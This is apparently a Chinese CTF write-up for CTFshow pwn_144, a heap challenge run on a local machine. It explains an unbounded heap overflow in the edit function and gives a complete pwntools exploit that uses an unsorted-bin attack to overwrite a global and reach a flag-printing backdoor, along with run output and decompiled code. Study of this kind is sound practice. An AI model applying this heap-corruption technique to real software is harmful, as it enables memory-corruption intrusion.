# CTFshow-pwn_144
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 堆利用（fastbin-堆溢出）
## 解题思路
> 利用 unsorted_bin_attck 实现大数字写入 （理论上也能用 house_of_spirit 但实际调试时存在较强偶然性，因为调试时发现 stdin@@GLIBC_2.2.5 的值的首字节(0x60208d)在0x70~0x7f间随机变化，导致伪 chunk 长度不好确定且不一定满足利用条件）

仅没有 PIE 保护，部分 RELRO，本地libc使用 2.23-0ubuntu11.3_amd64

```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn_144
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./pwn_144
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_144
[*] '/home/mrw/CTFshow/pwn_144'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64'
    Stripped:   No
```

- 程序支持 chunk 的增删查改，同时在 edit 时未验证输入长度，存在任意长度堆溢出。程序中存在后门函数且通过改写程序 bss 段上的 magic 为一个大于114514的无符号整数即可触发  
- 先申请一个 chunk 用于堆溢出，再申请一个长度大于 fastbins 范围的 chunk，最后申请一个 chunk 防止上一个 chunk 释放时直接与 top chunk 合并。然后释放第二个 chunk 进入 unsorted_bin（双向循环链表，满足先进先出），用堆溢出修改第二个 chunk 的 fd 为0，bk 为指定地址的前0x10处，则可以利用 unsorted_bin 的维护机制向指定地址写入 unsorted_bin 的链表头地址，从而实现大数据写入。  

**exp 如下**  
```python
from pwn import *
p = process('./pwn_144')
gdb.attach(p)
# 与程序沟通
def add_heap(siz, content):
  p.sendafter(b'Your choice :', b'1')
  p.sendafter(b'Size of Heap : ', str(siz).encode())
  p.sendafter(b'Content of heap:', content)

def edit_heap(index, siz, content):
  p.sendafter(b'Your choice :', b'2')
  p.sendafter(b'Index :', str(index).encode())
  p.sendafter(b'Size of Heap : ', str(siz).encode())
  p.sendafter(b'Content of heap : ', content)

def del_heap(index):
  p.sendafter(b'Your choice :', b'3')
  p.sendafter(b'Index :', str(index).encode())

def finish():
  p.sendafter(b'Your choice :', b'114514')

# 制造任意写大数
add_heap(0x10, b'a') # heap 0
add_heap(0x80, b'b') # heap 1
add_heap(0x10, b'c') # heap 2
del_heap(1)
edit_heap(0, 0x30, b'a' * 0x10 + p64(0) + p64(0x91) + p64(0) + p64(0x602090)) # 溢出修改 heap 2 的 bk 为 &magic - 0x10
add_heap(0x80, b'deadbeef') # 触发大数字写入
# 利用
finish()
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_144.py
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_144.py
[+] Starting local process './pwn_144': pid 19830
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_144', '-p', '19830']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Congrt !
fake{hajimionanbeiluduo}
--------------------------------
          Heap Creator          
--------------------------------
 1. Create a Heap               
 2. Edit a Heap                 
 3. Delete a Heap               
 4. Exit                        
--------------------------------
Your choice :$  
```

## 反编译后伪代码中有用的部分

反编译得到的有用的伪代码如下  
```c
int menu()
{
  puts("--------------------------------");
  puts("          Heap Creator          ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Delete a Heap               ");
  puts(" 4. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
unsigned __int64 create_heap()
{
  int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      printf("Size of Heap : ");
      read(0, buf, 8uLL);
      size = atoi(buf);
      heaparray[i] = malloc(size);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:");
      read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
unsigned __int64 edit_heap()
{
  unsigned int v1; // [rsp+4h] [rbp-1Ch]
  __int64 v2; // [rsp+8h] [rbp-18h]
  char buf[4]; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Size of Heap : ");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    printf("Content of heap : ");
    read_input(heaparray[v1], v2);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v4;
}
unsigned __int64 delete_heap()
{
  unsigned int v1; // [rsp+0h] [rbp-10h]
  char buf[4]; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0xA )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    free((void *)heaparray[v1]);
    heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
int TaT()
{
  return system("cat /flag");
}
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 8uLL);
      v3 = atoi(buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 114514 )
      {
        if ( (unsigned __int64)magic <= 0x1BF52 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          TaT();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```
